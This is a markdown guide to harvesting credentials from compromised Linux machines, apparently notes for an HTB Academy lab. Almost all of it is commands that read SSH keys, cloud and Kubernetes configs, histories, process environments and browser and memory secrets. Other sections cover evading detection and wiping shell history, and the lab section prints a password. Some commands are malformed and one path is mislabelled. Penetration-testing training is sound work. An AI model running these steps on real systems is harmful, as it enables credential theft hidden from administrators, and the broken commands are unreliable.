# 🛰️ Introduction to Linux Credential Hunting

Linux systems are a prime target for credential harvesting due to their extensive use in enterprise environments and the various ways credentials can be stored within files, environment variables, and running processes. This guide aims to provide a comprehensive approach to finding sensitive information on compromised Linux machines.

[!INFO] **Objective**: To systematically identify and extract passwords, keys, tokens, and other secret data from a Linux system during penetration testing or post-exploitation scenarios.

---

## 🔍 File System Credential Hunting

### Common Storage Locations
Credentials are often stored in various files across the file system. The following directories and files are common targets for credential hunting:

```bash
# Directories to search
/etc/
/home/*/.ssh/  # SSH keys
/home/*/.config/*   # Application-specific configs
/home/*/.aws/       # AWS credentials
/opt/*
/var/lib/containers/config.json    # Docker Swarm secrets

# Common file extensions and names
*.conf *.cfg *.ini *.json *.yml *.yaml *.env *.properties *.htpasswd
```

### Searching for Credentials
Use commands to search specific directories for files containing credentials:

```bash
# Search /etc/ directory for sensitive files
find /etc -name '*password*' 2>/dev/null

# Search home directories for SSH keys and configs
find /home/*/.ssh/id_*
find /home/*/.config/*

# Common config file extensions
for l in $(echo ".conf .cfg .ini .json .yml .yaml .env .properties .htpasswd");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done

# Check Docker Swarm secrets
ls -la /var/lib/docker/swarm/
```

---

## 🚀 Configuration Files

### SSH Configuration
SSH private keys are critical for accessing systems without a password. They can be found in the `.ssh` directory of user home folders.

```bash
find /home/*/.ssh/ 2>/dev/null | grep -v ".pub"
cat ~/.ssh/config
```

[!WARNING] Be cautious when listing files as this may alert system administrators to your actions.

### Application Configuration Files

Many applications store configuration in various formats:

```bash
# Common application config files
find /opt/* -name '*config*' 2>/dev/null | grep -v "doc\|lib"
find /etc/ -type f \( -iname "*.conf" -o -iname "*.ini" -o -iname "*.json" \) 2>/dev/null

# Example: MySQL configuration
cat /etc/mysql/debian.cnf | grep -i password
```

---

## 📝 Command History and Environment Variables

### Command History
Command history files often contain commands executed by users which may include credentials.

```bash
cat ~/.bash_history
cat ~/.zsh_history
```

[!WARNING] Command histories can be a goldmine but also trigger alarms if not handled carefully.

### Environment Variables
Many applications and scripts use environment variables to store secrets. 

```bash
env | grep -i pass
printenv | grep -i secret
export | grep -i token
```

---

## 🖥️ Running Processes

### Process Environment Variables
Running processes often have sensitive information in their environment variables.

```bash
ps aux | grep -v grep
ps eww $(pgrep -u $(whoami)) 2>/dev/null | grep -iv 'grep'
env | grep -i pass
```

[!WARNING] Be discreet when listing running processes as it can alert administrators to your presence.

### Memory-Based Extraction
Credentials may be cached in the memory of running applications.

```bash
# Using mimipenguin for memory extraction
sudo python3 /usr/share/mimipenguin/mimipenguin.py

# Extracting credentials from Firefox cache (if applicable)
python3 firefox_decrypt.py
```

---

## 🚀 Container and Kubernetes Credential Hunting

### Docker Secrets
Docker Swarm stores secrets in specific directories.

```bash
ls -la /var/lib/docker/swarm/
```

[!WARNING] Accessing these files may require elevated privileges, be cautious about leaving traces.

### Kubernetes Configurations
Kubernetes configurations can contain sensitive information such as tokens and API keys.

```bash
cat ~/.kube/config

# Service account token in Kubernetes pods
kubectl get secrets --all-namespaces 2>/dev/null | grep -i token
```

[!WARNING] Be aware of potential logging and monitoring within Kubernetes environments.

---

## 🌐 Systematic Linux Credential Hunting Checklist

### Phase 1: Initial Reconnaissance
```bash
# System information
uname -a
whoami
id
groups
sudo -l

# Current directory and home
pwd
ls -la ~
```

[!CHECK] Verify if you have necessary permissions to proceed with deeper reconnaissance.

### Phase 2: File System Discovery
```bash
# Search for sensitive files
find /etc/ -name "*password*" 2>/dev/null | head -50

# Find config files
for l in $(echo ".conf .config .cfg");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done

# User-specific files
find /home/*/.ssh/id_* 2>/dev/null | head -50
```

[!SUCCESS] Identify high-value targets based on file names and locations.

### Phase 3: Content Analysis
```bash
# File content analysis
grep -r -i "password" /etc/ 2>/dev/null | head -20

# Application-specific files
find /var/www/ -name "*.php" -o -name "*.py" | xargs grep -l -i password 2>/dev/null
```

[!SUCCESS] Use regular expressions to filter out noise and focus on relevant matches.

### Phase 4: History and Environment
```bash
# Command history
cat ~/.bash_history | grep -i -E "(ssh|mysql|password)"

# Process environment variables
ps auxww | grep $(whoami) | grep -v "grep"
```

[!SUCCESS] Review command histories for patterns indicating credential usage.

### Phase 5: Application-Specific Hunting
```bash
# Database credentials
find /etc/ -name "*mysql*" -o -name "*postgresql*" -o -name "*.conf" | xargs cat

# Web application credentials
grep -r -i "password" /var/www/* 2>/dev/null
```

[!SUCCESS] Focus on relevant directories based on the type of service running.

---

## 🛡️ Detection Evasion for Linux

### Stealth Techniques
```bash
# Use built-in commands instead of external tools
grep instead of custom scanners

# Time-delayed searches
sleep 5 && find / -name "*password*" 2>/dev/null

# Limit output to avoid detection
find / -name "*secret*" 10 | head -10

# Use process substitution for stealthy operations
grep -r "password" <(find /etc/ -name "*.conf")
```

[!SUCCESS] Minimize footprint by employing stealth techniques and limiting output.

### Cleanup Commands
```bash
# Clear command history
history -c; unset HISTFILE

# Remove temporary files
rm -f /tmp/*creds.txt*

# Clear environment variables
unset PASSWORD
unset SECRET_KEY
```

---

## 🎯 HTB Academy Lab Example

### Lab Scenario
- **Target**: SSH access to Linux system
- **Initial Access**: `ssh kira@TARGET_IP` with password `L0vey0u1!`
- **Objective**: Find the password of user "Will"

### Systematic Approach
```bash
# Step 1: Initial system reconnaissance
whoami
id

# Step 2: Search for configuration files
for l in $(echo ".conf .config");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done

# Step 3: Check command history for clues
cat ~/.bash_history | grep -i will

# Step 4: User-specific files and directories
find /home/ -type f \( -name "*will*" -o -name "*.txt" \) 2>/dev/null

# Step 5: Process environment variables
ps auxww | grep $(whoami)

# Step 6: Memory-based extraction (if root access available)
sudo python3 /usr/share/mimipenguin/mimipenguin.py

# Step 7: Browser credential extraction (if applicable)
ls -la ~/.mozilla/firefox/
python3 firefox_decrypt.py
```

[!SUCCESS] Follow these steps to methodically find the password of user "Will".

---

## 💡 Key Takeaways for Linux Credential Hunting

1. **File system is king** - Most credentials are stored in plain text files.
2. **History tells stories** - Command history often contains clues about credentials.
3. **Environment variables** - Modern applications use them extensively.
4. **SSH keys everywhere** - Private keys are a valuable target.
5. **Log files reveal secrets** - Applications may log credential errors.
6. **Container secrets** - Docker and Kubernetes have new ways to store secrets.
7. **Process memory** - Running processes can cache credentials in memory.
8. **Configuration diversity** - Every application has its own config format.
9. **HTB Academy methodology** - Systematic file extension searches yield results.
10. **Detection evasion** - Minimize footprint and clean up after yourself.

---

[!INFO] By following these guidelines, you can effectively identify and extract sensitive credentials from compromised Linux systems without raising alarms. 

--- 

This guide aims to provide a structured approach to conducting credential harvesting on Linux environments during security assessments and red team exercises. For further details or specific scenarios, refer to relevant documentation and best practices in ethical hacking. 

[!INFO] **Disclaimer**: This document is intended for educational purposes only and should be used responsibly within the bounds of legal frameworks and ethical guidelines.

--- 

# 🚀 Thank you for using this guide. Happy Hunting! 🦕